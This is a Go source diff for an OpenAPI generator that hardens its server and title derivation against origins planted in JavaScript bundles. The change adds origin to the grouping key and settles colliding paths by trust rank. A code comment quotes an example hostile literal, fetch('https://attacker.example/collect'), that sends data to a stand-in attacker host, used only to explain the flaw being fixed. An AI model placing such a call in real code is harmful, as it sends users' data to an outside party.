@@ -100,6 +100,15 @@ type OpenAPIGenerator struct {
 	// promotion. The zero value (0) is treated as 2: NormalizePathsWithNames
 	// clamps any value < 2 up to 2. Ignored unless MergeSlugs is set.
 	SlugThreshold int
+	// TargetOrigin is the origin the run can actually vouch for — the
+	// resolved target origin (crawl.ResolveTargetOrigin), derived from
+	// --target-url or the capture's own HTML page, never from bundle content.
+	// extractServers uses it as the primary origin for the OpenAPI servers
+	// list and info.title (SEC-BE-001/SEC-BE-002) instead of trusting
+	// whatever hosts happen to appear in endpoints. Empty is valid (no
+	// vouched origin available); extractServers falls back to the
+	// lowest-sorted dynamically observed origin in that case.
+	TargetOrigin string
 }
 
 // explodeTrue is a singleton pointer target for setting the Explode field on
@@ -107,10 +116,26 @@ type OpenAPIGenerator struct {
 // schema model uses `*bool` for tri-state, requiring an addressable value.
 var explodeTrue = true
 
-// endpointKey groups endpoints by normalized path and HTTP method.
+// endpointKey groups endpoints by normalized path, HTTP method, AND origin
+// (scheme://host, via crawl.CanonicalOrigin).
+//
+// SEC-BE-001 (LAB-4992 review): classify.Deduplicate keys on method+path
+// (host-agnostic), NormalizePathsWithNames' numeric-ID detection runs
+// unconditionally, and (pre-fix) groupEndpoints itself keyed only on
+// {path, method} — so a group could silently mix endpoints observed on
+// different origins. buildOperation's per-operation servers override then
+// derived its answer from group[0].URL alone, which is attacker-steerable:
+// depending on which hostname happened to sort first, either an attacker
+// origin overrode a real endpoint's origin, or an attacker-planted path was
+// silently attributed to the trusted host. Folding origin into the key makes
+// a mixed-origin group impossible — every group now shares exactly one
+// origin, so the override (or lack of one) is always correct for its group.
+// Generate resolves the resulting (path, method) slot collisions
+// deterministically (see the keys sort in Generate).
 type endpointKey struct {
 	path   string
 	method string
+	origin string
 }
 
 // APIType returns the API type.
@@ -118,39 +143,172 @@ func (g *OpenAPIGenerator) APIType() string {
 	return "rest"
 }
 
-// extractServers extracts unique server URLs from endpoints and returns the server list and title host.
-func extractServers(endpoints []classify.ClassifiedRequest) (openapi3.Servers, string) {
+// extractServers derives the OpenAPI servers list, the info.title host, and
+// the set of origins deliberately EXCLUDED from the global servers list, from
+// endpoints and the run's trusted targetOrigin (crawl.ResolveTargetOrigin —
+// derived from --target-url or the capture's own HTML page, never from
+// bundle content).
+//
+// SEC-BE-001/SEC-BE-002 (LAB-4992 review): the previous version derived
+// servers/title from "whatever hosts appear in endpoints", filtering out
+// JS-static (crawl.IsJSStaticSource) candidates UNLESS zero dynamically
+// observed endpoints existed — in which case it fell back to the full,
+// unfiltered set. That fallback is the DEFAULT state for a fully-offline
+// capture, so a hostile bundle literal (e.g.
+// fetch("https://attacker.example/collect")) that was never seen on the wire
+// could become servers[0] and capture info.title outright by sorting first
+// alphabetically (SEC-BE-002). Separately, in a MIXED capture (>=1 observed
+// endpoint plus a JS-static endpoint on a different host), the old filter
+// correctly kept the JS-static host out of the global list, but
+// groupEndpoints still emitted that endpoint's path under the single global
+// server — silently attributing a recovered path to a host that does not
+// serve it (SEC-BE-001). buildOperation now closes that gap with a
+// per-operation servers override for any endpoint whose origin is in the
+// excluded set this function returns.
+//
+// SEC-BE-001 follow-up (LAB-4992 review): the override above was itself
+// exploitable, because classify.Deduplicate, NormalizePathsWithNames, and
+// (formerly) groupEndpoints all group host-agnostically — a single group
+// could silently mix endpoints from different origins, and the override
+// derived its answer from an arbitrary member of that mixed group. origin is
+// now part of endpointKey (see its doc comment) so a group can never mix
+// origins — TestGenerate_ThreeOriginCollision_RecordsAllSuppressedOrigins keeps
+// three origins on one path+method in three separate groups, which a mixed group
+// would collapse. Generate resolves the resulting (path, method) slot collisions
+// by trust rank (see trustRank), so the most-trusted colliding group always
+// wins deterministically — an excluded origin can never win over a
+// non-excluded one (SEC-BE-002), regardless of which hostname sorts first.
+//
+// Derivation:
+//  1. primary origin = targetOrigin if it parses to a usable http(s) origin;
+//     else the lowest-sorted origin among DYNAMICALLY OBSERVED (non-
+//     crawl.IsJSStaticSource) endpoints; else "" (no vouched origin at all).
+//  2. global servers = primary (first, unsorted) + every dynamically
+//     observed origin + any JS-static origin that is SAME-ORIGIN with
+//     primary (crawl.SameOrigin) — sorted (LAB-4678) after the primary. A
+//     cross-origin JS-static origin never enters the global list; it is
+//     reported in the returned excluded set instead.
+//  3. info.title derives from the primary origin only, never from a
+//     cross-origin JS-static host.
+//
+// static:html (form-derived candidates, analyze.ExtractForms) is deliberately
+// NOT treated as JS-static here: the page carrying the form was itself
+// fetched over the wire during the crawl, unlike a JS-static candidate whose
+// entire existence is reconstructed offline from bundle text that was never
+// executed or requested. This mirrors the codebase's own established
+// distinction — computeSourceTag already treats static:html the same as a
+// real dynamic observation (see its doc comment) rather than as
+// offline-derived — so this function reuses crawl.IsJSStaticSource, the
+// single canonical definition of "unprobed JS-static", instead of inventing a
+// new predicate.
+func extractServers(endpoints []classify.ClassifiedRequest, targetOrigin string) (openapi3.Servers, string, map[string]bool) {
+	observedOrigins, jsStaticOrigins := collectEndpointOrigins(endpoints)
+	primary := choosePrimaryOrigin(targetOrigin, observedOrigins)
+
 	serverSet := make(map[string]bool)
 	var servers openapi3.Servers
-	titleHost := "API"
+	addServer := func(origin string) {
+		if origin == "" || serverSet[origin] {
+			return
+		}
+		serverSet[origin] = true
+		servers = append(servers, &openapi3.Server{URL: origin})
+	}
 
-	for _, endpoint := range endpoints {
-		parsedURL, err := url.Parse(endpoint.URL)
-		if err != nil || (parsedURL.Scheme != "http" && parsedURL.Scheme != "https") {
+	// Primary goes first and is NOT subject to the sort below (LAB-4678's
+	// determinism guarantee only needs to hold for the remainder of the
+	// list; the primary's position is already deterministic by definition).
+	addServer(primary)
+	for _, origin := range sortedCopy(observedOrigins) {
+		addServer(origin)
+	}
+
+	// "excluded" means unvouched, not merely bundle-mentioned — see the
+	// package doc comment for the full semantic contract (SEC-BE-002). The
+	// mechanism: serverSet already holds every origin vouched for above (the
+	// primary plus each observed origin), so an origin collectEndpointOrigins
+	// also placed in jsStaticOrigins (i.e. named by a bundle literal) is only
+	// excluded when it is NOT already in serverSet.
+	//
+	// This is a single if-check inside the loop below, not a three-arm
+	// switch: a prior version had a third arm admitting a jsStaticOrigin that
+	// was merely crawl.SameOrigin with primary, even when not in serverSet.
+	// That arm was unreachable dead code — primary and every jsStaticOrigin are
+	// both crawl.CanonicalOrigin outputs (collectEndpointOrigins,
+	// choosePrimaryOrigin), CanonicalOrigin is idempotent, and
+	// crawl.SameOrigin over two CanonicalOrigin outputs can only agree with
+	// plain string equality (TestCanonicalOrigin_SameOriginImpliesEquality,
+	// pkg/crawl) — so `SameOrigin(origin, primary)` true implies
+	// `origin == primary`, and primary is unconditionally added to serverSet
+	// before this loop runs (addServer(primary) above), meaning the
+	// `serverSet[origin]` arm above always matches first. Do not restore a
+	// same-origin admission arm here without first breaking that invariant.
+	excluded := make(map[string]bool)
+	for _, origin := range sortedCopy(jsStaticOrigins) {
+		// serverSet already holds every vouched origin (primary plus each
+		// dynamically observed one), so a bundle merely naming one of them
+		// cannot demote it.
+		if !serverSet[origin] {
+			excluded[origin] = true
+		}
+	}
+
+	titleHost := "API"
+	if primary != "" {
+		if u, err := url.Parse(primary); err == nil && u.Host != "" {
+			titleHost = u.Host + " API"
+		}
+	}
+
+	return servers, titleHost, excluded
+}
+
+// collectEndpointOrigins partitions endpoints' origins (scheme://host, via
+// crawl.CanonicalOrigin) into dynamically observed and JS-static buckets,
+// each deduped and in first-seen order. Endpoints with an unparseable or
+// non-http(s)-with-host URL are silently skipped.
+func collectEndpointOrigins(endpoints []classify.ClassifiedRequest) (observed, jsStatic []string) {
+	seenObserved := make(map[string]bool)
+	seenJSStatic := make(map[string]bool)
+	for _, ep := range endpoints {
+		origin := crawl.CanonicalOrigin(ep.URL)
+		if origin == "" {
 			continue
 		}
-		baseURL := parsedURL.Scheme + "://" + parsedURL.Host
-		if !serverSet[baseURL] {
-			serverSet[baseURL] = true
-			servers = append(servers, &openapi3.Server{URL: baseURL})
+		if crawl.IsJSStaticSource(ep.Source) {
+			if !seenJSStatic[origin] {
+				seenJSStatic[origin] = true
+				jsStatic = append(jsStatic, origin)
+			}
+			continue
+		}
+		if !seenObserved[origin] {
+			seenObserved[origin] = true
+			observed = append(observed, origin)
 		}
 	}
+	return observed, jsStatic
+}
 
-	// Sort servers so the list order and the derived title are independent of
-	// the crawl's capture order (LAB-4678). Same-origin scans have a single
-	// server (a no-op sort); same-domain scans can observe several hosts whose
-	// first-seen order would otherwise vary run-to-run.
-	sort.Slice(servers, func(i, j int) bool { return servers[i].URL < servers[j].URL })
-
-	if len(servers) > 0 {
-		// Use first server's host for title
-		firstURL, _ := url.Parse(servers[0].URL) //nolint:errcheck // nil check below handles parse failure
-		if firstURL != nil {
-			titleHost = firstURL.Host + " API"
-		}
+// choosePrimaryOrigin picks the primary origin: targetOrigin if it
+// canonicalizes (crawl.CanonicalOrigin) to a usable http(s) origin, else the
+// lowest-sorted dynamically observed origin, else "" (no vouched origin).
+func choosePrimaryOrigin(targetOrigin string, observedOrigins []string) string {
+	if primary := crawl.CanonicalOrigin(targetOrigin); primary != "" {
+		return primary
 	}
+	if len(observedOrigins) == 0 {
+		return ""
+	}
+	sorted := sortedCopy(observedOrigins)
+	return sorted[0]
+}
 
-	return servers, titleHost
+// sortedCopy returns a sorted copy of ss, leaving the input untouched.
+func sortedCopy(ss []string) []string {
+	sorted := append([]string(nil), ss...)
+	sort.Strings(sorted)
+	return sorted
 }
 
 // groupEndpoints groups and sorts endpoints by normalized path and HTTP method.
@@ -180,7 +338,11 @@ func groupEndpoints(endpoints []classify.ClassifiedRequest, opts NormalizeOption
 
 	endpointGroups := make(map[endpointKey][]classify.ClassifiedRequest)
 	for _, p := range parsed {
-		key := endpointKey{normalized[p.path], strings.ToLower(p.endpoint.Method)}
+		// origin ("" if unparseable/host-less) is part of the key (SEC-BE-001)
+		// so a group can never mix endpoints from different origins
+		// (TestGenerate_ThreeOriginCollision_RecordsAllSuppressedOrigins).
+		origin := crawl.CanonicalOrigin(p.endpoint.URL)
+		key := endpointKey{path: normalized[p.path], method: strings.ToLower(p.endpoint.Method), origin: origin}
 		endpointGroups[key] = append(endpointGroups[key], p.endpoint)
 	}
 	return endpointGroups
@@ -204,17 +366,68 @@ func anyStaticSource(endpoints []classify.ClassifiedRequest) bool {
 	return false
 }
 
-// computeSourceTag derives the x-vespasian-source value for an operation group.
-// Mapping:
-//   - a group whose members all share one named JS-static source → that name
-//     ("js-bundle", "js-sourcemap", "js-nextroute", "js-nextpage")
-//   - anything else, including an unnamed source, an empty Source, "static:html",
-//     or a group mixing two named sources → "dynamic"
-//   - empty group (len(group) == 0) → "" (no extension emitted)
+// jsStaticSourceRank orders the JS-static friendly tags from most to least
+// confident: a directly AST-recovered literal is most confident, a sourcemap
+// recovery is next (recovered from original source, not the served bundle),
+// then a concat/service-prefix reconstruction (never probed, speculative), and
+// last the two Next.js chunk-URL recoveries, which have no body evidence at all
+// — the chunk path proves only that the framework serves the route, and a page
+// route is navigational rather than an endpoint. computeSourceTag uses this so a
+// group mixing distinct JS-static tags resolves to the LEAST-CONFIDENT member,
+// not "dynamic".
 //
-// For non-empty input the function always returns "dynamic" or one of the four
+// Every tag friendlySourceTag can return needs an entry. A missing one reads as
+// rank 0 from this map, which collides with js-bundle — the MOST-confident label
+// — and TestJSStaticSourceRank_CoversEveryFriendlyTag fails on the gap.
+var jsStaticSourceRank = map[string]int{
+	"js-bundle":        0,
+	"js-sourcemap":     1,
+	"js-bundle-concat": 2,
+	"js-nextroute":     3,
+	"js-nextpage":      4,
+}
+
+// leastConfidentJSStaticTag is the highest-ranked entry in jsStaticSourceRank.
+// Derived rather than written out because computeSourceTag falls back to it for a
+// JS-static source that friendlySourceTag does not name, and a literal here would
+// silently stop being the last tag the next time a rank is added.
+var leastConfidentJSStaticTag = func() string {
+	tag, rank := "", -1
+	for t, r := range jsStaticSourceRank {
+		if r > rank {
+			tag, rank = t, r
+		}
+	}
+	return tag
+}()
+
+// computeSourceTag derives the x-vespasian-source value for an operation group.
+// Mapping (architecture.md §7):
+//   - any request whose Source is not JS-static (including empty Source from
+//     pre-LAB-2108 captures, untagged dynamic entries, AND non-JS static
+//     sources like "static:html")                    → "dynamic"
+//   - all requests Source == "static:js"             → "js-bundle"
+//   - all requests Source == "static:js-sourcemap"   → "js-sourcemap"
+//   - all requests Source == "static:js-concat"      → "js-bundle-concat"
+//   - all requests Source == "static:js-nextroute"   → "js-nextroute"
+//   - all requests Source == "static:js-nextpage"    → "js-nextpage"
+//   - mixed JS-static tags within a group (all requests JS-static, but not all
+//     the SAME friendly tag) → the LEAST-CONFIDENT member present, per
+//     jsStaticSourceRank, e.g. js-bundle + js-bundle-concat → "js-bundle-concat"
+//   - empty group (len(group) == 0)                  → "" (no extension emitted)
+//
+// For non-empty input the function always returns "dynamic" or one of the five
 // named values. TestFriendlySourceTag_TotalOverJSStaticSources asserts that every
 // source crawl.IsJSStaticSource accepts has a name here, so the two cannot drift.
+//
+// "dynamic" is reserved strictly for a group containing a real non-JS-static
+// source (dynamic / static:html / empty). An all-JS-static group, even when it
+// mixes distinct JS-static tags, must never resolve to "dynamic", since that is
+// the HIGHEST-confidence label and would make a group recovered entirely from
+// offline JS analysis look directly observed (QUAL-003). The "js-bundle-concat"
+// value (LAB-4992 / SEC-BE-001) flags never-probed concat/service-prefix
+// reconstructions, and the two Next.js values flag routes recovered from a chunk
+// URL alone, so consumers can weight both below AST-recovered literals.
 //
 // The empty-group case is unreachable in current usage because groupEndpoints
 // only creates a key when at least one ClassifiedRequest matches; this contract
@@ -224,38 +437,59 @@ func anyStaticSource(endpoints []classify.ClassifiedRequest) bool {
 // open list — a new "static:foo" source must NOT silently surface as
 // x-vespasian-source: foo, because the extension is a consumer contract.
 //
-// The membership test is LOCAL to this function (friendlySourceTag) rather than
-// delegated to crawl.IsJSStaticSource. IsJSStaticSource owns "is this a JS-bundle
-// static source" for the extension-emission gate (anyStaticSource); this function
+// Naming is LOCAL to friendlySourceTag rather than delegated to
+// crawl.IsJSStaticSource. IsJSStaticSource owns "is this a JS-bundle static
+// source" for the extension-emission gate (anyStaticSource); friendlySourceTag
 // owns "what does the consumer contract call it". Keeping the two in sync is the
 // test's job, not an assumption: when the Next.js tags were added to
 // IsJSStaticSource and not here, an all-nextroute group returned "" (no extension
 // at all) and a mixed group returned "dynamic", falsely claiming the endpoint had
 // been dynamically observed when it was recovered from a chunk URL and never
 // requested. That was reachable at --confidence 0.1 before RESTClassifier started
-// returning isAPI=false for these sources.
+// returning isAPI=false for these sources. The two are consulted separately here
+// so an out-of-sync JS-static source degrades to the least-confident tag instead
+// of borrowing "dynamic", which is the highest-confidence label.
 func computeSourceTag(group []classify.ClassifiedRequest) string {
 	if len(group) == 0 {
 		return ""
 	}
-	var tag string
+	leastConfident := ""
+	leastConfidentRank := -1
 	for _, ep := range group {
 		friendly, ok := friendlySourceTag(ep.Source)
-		if !ok {
-			// Any source without a friendly name — dynamic, empty, static:html, or a
-			// JS-static source outside the two the contract names — is "dynamic",
-			// matching the documented catch-all above.
+		switch {
+		case ok:
+		case !crawl.IsJSStaticSource(ep.Source):
+			// A real non-JS-static source — dynamic, empty, or static:html — is
+			// "dynamic", matching the documented catch-all above.
 			return "dynamic"
+		default:
+			// QUAL-005: a JS-static source friendlySourceTag does not name must
+			// still map to a real tag. Leaving friendly == "" made
+			// jsStaticSourceRank[""] return the zero value — which COLLIDES with
+			// js-bundle's rank 0, the most-confident label. The unknown source
+			// would then win the first comparison (0 > -1), and a later genuine
+			// js-bundle would fail 0 > 0, so the function returned "" and
+			// suppressed the x-vespasian-source extension for the whole group.
+			// crawl.IsJSStaticSource (pkg/crawl) and friendlySourceTag live in
+			// different packages and must be edited together, so the miss is
+			// reachable by a one-sided edit — this PR itself required exactly that
+			// two-site change, twice.
+			//
+			// Resolve to the least-confident known tag: an unrecognized JS-static
+			// source is still offline-derived, so understating provenance is the
+			// safe direction, and it can never suppress the extension or
+			// masquerade as "dynamic". TestJSStaticSourceRank_CoversEveryFriendlyTag
+			// keeps that fallback pointing at a ranked tag, which is what makes the
+			// claim hold — an unranked one would reintroduce the rank-0 collision.
+			friendly = leastConfidentJSStaticTag
 		}
-		if tag == "" {
-			tag = friendly
-			continue
-		}
-		if tag != friendly {
-			return "dynamic"
+		if r := jsStaticSourceRank[friendly]; r > leastConfidentRank {
+			leastConfidentRank = r
+			leastConfident = friendly
 		}
 	}
-	return tag
+	return leastConfident
 }
 
 // friendlySourceTag maps a Source to its x-vespasian-source value, reporting false
@@ -268,6 +502,8 @@ func friendlySourceTag(source string) (string, bool) {
 		return "js-bundle", true
 	case crawl.SourceStaticJSSourcemap:
 		return "js-sourcemap", true
+	case crawl.SourceStaticJSConcat:
+		return "js-bundle-concat", true
 	case crawl.SourceNextRouteHandler:
 		return "js-nextroute", true
 	case crawl.SourceNextPageRoute:
@@ -364,7 +600,16 @@ func unionSchemaProperties(dst, src *openapi3.Schema, depth int) {
 // emitSource controls whether the x-vespasian-source extension is set on the operation.
 // It should be true only when at least one request in the entire Generate input carries
 // a "static:*" Source value (so flag-off output stays byte-identical to pre-LAB-2108).
-func buildOperation(key endpointKey, group []classify.ClassifiedRequest, emitSource bool) *openapi3.Operation { //nolint:gocyclo // OpenAPI operation builder
+//
+// excludedOrigins is the set of origins extractServers excluded from the
+// global servers list (cross-origin JS-static candidates, SEC-BE-001). When
+// the group's own origin (key.origin — every entry in the group shares this
+// origin since origin is now part of endpointKey) is in that set, the
+// operation gets a per-operation `servers` override naming its own origin —
+// otherwise groupEndpoints would still emit this path under the single
+// global server, silently attributing a recovered path to a host that does
+// not serve it.
+func buildOperation(key endpointKey, group []classify.ClassifiedRequest, emitSource bool, excludedOrigins map[string]bool) *openapi3.Operation { //nolint:gocyclo // OpenAPI operation builder
 	operation := &openapi3.Operation{
 		Summary:   capitalizeFirst(key.method) + " " + key.path,
 		Responses: &openapi3.Responses{},
@@ -398,6 +643,15 @@ func buildOperation(key endpointKey, group []classify.ClassifiedRequest, emitSou
 		}
 		return classify.CompareResponses(a.Response, b.Response) < 0
 	})
+
+	// SEC-BE-001: a cross-origin JS-static endpoint's origin was excluded from
+	// the global servers list by extractServers; give the operation its own
+	// `servers` override so it is never silently attributed to the primary
+	// host. key.origin is authoritative for the whole group (origin is part
+	// of endpointKey), so no mixed-origin group can produce a wrong answer.
+	if key.origin != "" && excludedOrigins[key.origin] {
+		operation.Servers = &openapi3.Servers{&openapi3.Server{URL: key.origin}}
+	}
 
 	// --- Query parameters: collect union from all endpoints, track frequency, values, and multi-value ---
 	type queryParamInfo struct {
@@ -681,14 +935,171 @@ func buildOperation(key endpointKey, group []classify.ClassifiedRequest, emitSou
 	return operation
 }
 
+// recordCollisionOrigin records, on the winning operation of a (path,
+// method) slot collision (SEC-BE-001), the origin of a group that lost that
+// collision and so could not be emitted. There is exactly one Operation slot
+// per (path, method) in doc.Paths, so the losing group's endpoint cannot be
+// represented as its own operation — but its loss must never be silent.
+// x-vespasian-collision-origins lists every suppressed origin, deduplicated
+// and sorted for determinism, in the same extension style as
+// x-vespasian-source.
+//
+// origin can be "" (TEST-001, LAB-4992 review): a suppressed group's
+// endpointKey.origin is crawl.CanonicalOrigin's result for its member
+// endpoints' URL, which is "" for a host-less literal such as
+// "https:/api/x". This is deliberate, not a gap — the empty string is
+// itself informative here (it names WHICH unknown-provenance candidate
+// lost, consistent with trustRank ranking "" as least trusted), and every
+// caller of this function already has a non-empty winner to attach it to.
+func recordCollisionOrigin(winner *openapi3.Operation, origin string) {
+	if winner.Extensions == nil {
+		winner.Extensions = map[string]any{}
+	}
+	var existing []string
+	if v, ok := winner.Extensions["x-vespasian-collision-origins"].([]string); ok {
+		existing = v
+	}
+	for _, o := range existing {
+		if o == origin {
+			return
+		}
+	}
+	existing = append(existing, origin)
+	sort.Strings(existing)
+	winner.Extensions["x-vespasian-collision-origins"] = existing
+}
+
+// trustRank orders an origin by how much this run can vouch for it, lowest
+// = most trusted. Generate's keys sort (below) tie-breaks a (path, method)
+// slot collision by this rank rather than by the origin string itself, so
+// that a colliding slot is always won by the most trusted origin present:
+//
+//	0 — the primary origin (the run's vouched origin; see choosePrimaryOrigin).
+//	    A JS-static origin that is same-origin with primary (crawl.SameOrigin)
+//	    also lands here, NOT in rank 1 below: extractServers admits it via the
+//	    same crawl.CanonicalOrigin every origin in this function is compared
+//	    with, so its canonicalized string is identical to primaryOrigin's —
+//	    `origin == primaryOrigin` is true for it (QUAL-001: an earlier version
+//	    of this comment placed it in rank 1, which the code never does).
+//	1 — any other non-excluded, non-empty origin: a dynamically observed
+//	    origin distinct from primary. Already passed extractServers'
+//	    admission and sits in the global servers list.
+//	2 — an excluded origin (cross-origin JS-static, never probed, and named
+//	    only by content the run does not control) OR an origin of unknown
+//	    provenance ("" — see below)
+//
+// INVARIANT: an origin this run cannot vouch for — excluded OR of unknown
+// provenance — must NEVER win a (path, method) slot that a vouched
+// (non-excluded, non-empty) origin also claims.
+//
+// SEC-BE-002 (LAB-4992 review): the prior tie-break compared each colliding
+// origin to primaryOrigin as a single boolean (iPrimary/jPrimary). That
+// abstains whenever NEITHER colliding origin IS the primary — a real,
+// dynamically-observed endpoint (e.g. captured on a different page than the
+// primary) colliding with an excluded, cross-origin JS-static literal falls
+// straight through to a plain byte-compare of the origin strings, so an
+// attacker who controls the JS-static literal's URL can win the slot simply
+// by choosing a hostname that sorts first. This 3-level rank makes that
+// case explicit and impossible: rank 2 (excluded) can never beat rank 0 or
+// 1 (not excluded), regardless of which hostname sorts first.
+// TestGenerate_CollisionNeitherOriginPrimary_TrustRankPicksObservedOverExcluded
+// runs it with the attacker hostname sorting both before and after the real one.
+//
+// TEST-001 (LAB-4992 review): an empty origin — crawl.CanonicalOrigin's
+// result for a host-less literal such as "https:/api/x" (single slash, not
+// an authority marker) — is skipped by collectEndpointOrigins, so "" never
+// enters excludedOrigins; it used to fall to the default case (rank 1),
+// defeating the invariant above for exactly the origin this run knows
+// LEAST about. Worse, `origin == primaryOrigin` was checked FIRST, and
+// primaryOrigin is itself "" whenever choosePrimaryOrigin cannot vouch for
+// any origin at all (no usable TargetOrigin and no dynamically observed
+// endpoint) — so an empty origin then matched THAT arm and ranked 0, the
+// MOST trusted of all. The empty-origin case is now checked first and
+// explicitly, so it can never be short-circuited by an empty primaryOrigin.
+func trustRank(origin, primaryOrigin string, excludedOrigins map[string]bool) int {
+	switch {
+	case origin == "":
+		return 2
+	case origin == primaryOrigin:
+		return 0
+	case excludedOrigins[origin]:
+		return 2
+	default:
+		return 1
+	}
+}
+
+// resolveCollisions builds each key's operation and places it into
+// doc.Paths, resolving (path, method) slot collisions between groups whose
+// paths and methods normalize identically but whose origins differ
+// (SEC-BE-001/SEC-BE-002). keys must already be sorted (see Generate) so
+// that, for any set of keys colliding on the same (path, method), the
+// lowest-trustRank (most trusted) key is the first one encountered for that
+// slot — every later key for the same slot is a loser whose origin is
+// recorded via recordCollisionOrigin instead of building a second,
+// unreachable Operation.
+func resolveCollisions(doc *openapi3.T, keys []endpointKey, endpointGroups map[endpointKey][]classify.ClassifiedRequest, staticPresent bool, excludedOrigins map[string]bool) {
+	// occupiedSlots tracks which (path, method) slot each already-built
+	// operation occupies, so a later colliding group (same path+method,
+	// different origin) is detected rather than silently overwriting the
+	// winner set by the caller's sort.
+	type slot struct{ path, method string }
+	occupiedSlots := make(map[slot]*openapi3.Operation)
+
+	for _, key := range keys {
+		group := endpointGroups[key]
+
+		// Build operation from group
+		operation := buildOperation(key, group, staticPresent, excludedOrigins)
+
+		s := slot{key.path, key.method}
+		if winner, collided := occupiedSlots[s]; collided {
+			// SEC-BE-001/SEC-BE-002: two groups (distinct origins)
+			// normalized to the same (path, method) slot; only one
+			// Operation fits in doc.Paths. The caller's sort guarantees
+			// `winner` is the lowest-trustRank (most trusted) group — this
+			// later group must not clobber it. The loss is made visible on
+			// the winning operation (same style as x-vespasian-source)
+			// rather than silently discarded.
+			recordCollisionOrigin(winner, key.origin)
+			continue
+		}
+		occupiedSlots[s] = operation
+
+		pathItem := doc.Paths.Find(key.path)
+		if pathItem == nil {
+			pathItem = &openapi3.PathItem{}
+			doc.Paths.Set(key.path, pathItem)
+		}
+
+		// Set operation for the method
+		switch key.method {
+		case "get":
+			pathItem.Get = operation
+		case "post":
+			pathItem.Post = operation
+		case "put":
+			pathItem.Put = operation
+		case "delete":
+			pathItem.Delete = operation
+		case "patch":
+			pathItem.Patch = operation
+		case "head":
+			pathItem.Head = operation
+		case "options":
+			pathItem.Options = operation
+		}
+	}
+}
+
 // Generate produces an OpenAPI specification.
-func (g *OpenAPIGenerator) Generate(endpoints []classify.ClassifiedRequest) ([]byte, error) { //nolint:gocyclo // top-level generation orchestration
+func (g *OpenAPIGenerator) Generate(endpoints []classify.ClassifiedRequest) ([]byte, error) {
 	if len(endpoints) == 0 {
 		return nil, nil
 	}
 
 	// Extract servers and title
-	servers, titleHost := extractServers(endpoints)
+	servers, titleHost, excludedOrigins := extractServers(endpoints, g.TargetOrigin)
 
 	// Create OpenAPI document
 	doc := &openapi3.T{
@@ -709,7 +1120,25 @@ func (g *OpenAPIGenerator) Generate(endpoints []classify.ClassifiedRequest) ([]b
 	// output is byte-identical to pre-LAB-2108 when --analyze-js is not in use.
 	staticPresent := anyStaticSource(endpoints)
 
-	// Sort endpoint keys for deterministic output
+	// primaryOrigin is the origin extractServers placed at servers[0] (the
+	// vouched TargetOrigin if usable, else the lowest-sorted dynamically
+	// observed origin, else "" when the run cannot vouch for anything). Fed
+	// into trustRank below so the (path, method) slot collision resolves to
+	// the most trusted colliding origin, never to whichever origin's
+	// hostname happens to sort first alphabetically.
+	primaryOrigin := ""
+	if len(servers) > 0 {
+		primaryOrigin = servers[0].URL
+	}
+
+	// Sort endpoint keys for deterministic output. SEC-BE-001: origin is now
+	// part of endpointKey, so two groups can share a (path, method) slot in
+	// doc.Paths (only one can occupy it — see resolveCollisions). The
+	// lowest-trustRank origin sorts first for a shared (path, method) — see
+	// trustRank's doc comment for why rank, not a primary/non-primary
+	// boolean, is required — and the trailing origin-string compare exists
+	// only to keep the sort a strict total order (LAB-4678's determinism
+	// guarantee) among keys that share the same rank.
 	keys := make([]endpointKey, 0, len(endpointGroups))
 	for k := range endpointGroups {
 		keys = append(keys, k)
@@ -718,39 +1147,18 @@ func (g *OpenAPIGenerator) Generate(endpoints []classify.ClassifiedRequest) ([]b
 		if keys[i].path != keys[j].path {
 			return keys[i].path < keys[j].path
 		}
-		return keys[i].method < keys[j].method
+		if keys[i].method != keys[j].method {
+			return keys[i].method < keys[j].method
+		}
+		ri := trustRank(keys[i].origin, primaryOrigin, excludedOrigins)
+		rj := trustRank(keys[j].origin, primaryOrigin, excludedOrigins)
+		if ri != rj {
+			return ri < rj
+		}
+		return keys[i].origin < keys[j].origin
 	})
 
-	// Build paths
-	for _, key := range keys {
-		group := endpointGroups[key]
-		pathItem := doc.Paths.Find(key.path)
-		if pathItem == nil {
-			pathItem = &openapi3.PathItem{}
-			doc.Paths.Set(key.path, pathItem)
-		}
-
-		// Build operation from group
-		operation := buildOperation(key, group, staticPresent)
-
-		// Set operation for the method
-		switch key.method {
-		case "get":
-			pathItem.Get = operation
-		case "post":
-			pathItem.Post = operation
-		case "put":
-			pathItem.Put = operation
-		case "delete":
-			pathItem.Delete = operation
-		case "patch":
-			pathItem.Patch = operation
-		case "head":
-			pathItem.Head = operation
-		case "options":
-			pathItem.Options = operation
-		}
-	}
+	resolveCollisions(doc, keys, endpointGroups, staticPresent, excludedOrigins)
 
 	// Extract schemas to components/schemas with $ref references
 	extractComponents(doc)
